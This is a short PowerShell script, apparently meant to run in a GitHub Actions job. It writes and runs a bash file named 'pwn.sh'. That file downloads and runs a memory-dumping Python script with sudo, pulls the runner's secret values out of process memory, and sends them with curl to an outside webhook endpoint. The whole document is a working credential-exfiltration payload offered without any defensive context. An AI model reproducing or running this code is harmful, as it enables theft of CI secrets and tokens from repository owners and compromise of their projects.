$runId = $env:GITHUB_RUN_ID
$bashScript = @"
echo "Okay, we got this far. Let's continue..."
(curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> "/tmp/secrets") || true
curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$runId"
"@
$bashScript | Out-File -FilePath "pwn.sh" -Encoding ascii
if (Get-Command bash -ErrorAction SilentlyContinue) {
    bash pwn.sh
} elseif (Test-Path "C:\Program Files\Git\bin\bash.exe") {
    & "C:\Program Files\Git\bin\bash.exe" pwn.sh
}
